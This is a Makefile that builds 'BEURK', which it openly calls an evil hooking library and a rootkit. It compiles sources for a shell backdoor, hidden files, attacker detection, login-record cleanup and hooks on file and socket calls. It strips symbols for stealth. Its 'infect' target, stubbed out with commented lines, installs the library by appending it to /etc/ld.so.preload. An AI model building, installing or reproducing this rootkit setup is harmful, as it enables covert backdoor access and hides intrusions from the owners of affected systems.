# use bash as Makefile's shell
SHELL				:= /bin/bash

# set default config values (can be overidden by setting env vars)
BEURK_CONFIG_FILE	?= beurk.conf
BEURK_LIBRARY_NAME	?= $(shell sed -ne 's/^LIBRARY_NAME\s*=\s*//p' < $(BEURK_CONFIG_FILE))
BEURK_DEBUG_LEVEL	?= $(shell sed -ne 's/^DEBUG_LEVEL\s*=\s*//p' < $(BEURK_CONFIG_FILE))
BEURK_INSTALL_DIR	?= $(shell sed -ne 's/^INSTALL_DIR\s*=\s*//p' < $(BEURK_CONFIG_FILE))

# compiler options
CFLAGS		:= -Iincludes -Wall -Wextra -Winline -Wunknown-pragmas -D_GNU_SOURCE
LDFLAGS		:= -lc -ldl -lutil -lpam

ifeq ($(BEURK_DEBUG_LEVEL), 0)
	CFLAGS	+= -fvisibility=hidden
endif

# take sources from /src and /src/hooks
SOURCES		= src/init.c \
			  src/config.c \
			  src/cleanup_login_records.c \
			  src/drop_shell_backdoor.c \
			  src/is_hidden_file.c \
			  src/is_attacker.c \
			  \
			  src/hooks/fopen.c \
			  src/hooks/readdir.c \
			  src/hooks/lstat.c \
			  src/hooks/open.c \
			  src/hooks/stat.c \
			  src/hooks/accept.c
OBJECTS		= $(patsubst src/%.c, obj/%.o, $(SOURCES))

# make standard rule phony
.PHONY: all re clean distclean test coverage infect disinfect

# build separate objects
obj/%.o: $(addprefix src/, %.c)
	@mkdir -p `dirname $@`
	@echo $@
	$(CC) $(CFLAGS) -fPIC -g -c $< -o $@

# build evil hooking library (not relink)
all: $(BEURK_LIBRARY_NAME)

# generate includes/config.h and src/config.c with builder
src/config.c:
	./reconfigure $(BEURK_CONFIG_FILE)

$(BEURK_LIBRARY_NAME): src/config.c $(OBJECTS)
	$(CC) -fPIC -shared -Wl,-soname,$(BEURK_LIBRARY_NAME) $(OBJECTS) \
		$(LDFLAGS) -o $(BEURK_LIBRARY_NAME)
ifeq ($(BEURK_DEBUG_LEVEL), 0)
	strip --strip-unneeded -R .note -R .comment $(BEURK_LIBRARY_NAME)
endif

# run all tests with `make test`
test:
	./utils/run-tests.sh ./tests

# compile DSO with flags for code coverage
coverage:
	@echo TODO ! && false

# infect current system with the rootkit
infect: $(BEURK_LIBRARY_NAME)
	@echo TODO ! && false
	#! test -e $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME)
	#cp $(BEURK_LIBRARY_NAME) $(BEURK_INSTALL_DIR)/
	#echo $(BEURK_INSTALL_DIR)/$(BEURK_LIBRARY_NAME) >> /etc/ld.so.preload

# uninstall the rootkit (if installed on current system)
disinfect:
	@echo TODO ! && false

# re build evil hooking library
re: distclean all

# remove object files
clean:
	-rm -rf obj/

# remove object files and evil hooking library
distclean: clean
	-rm -f $(BEURK_LIBRARY_NAME)
	-rm -f src/config.c includes/config.h
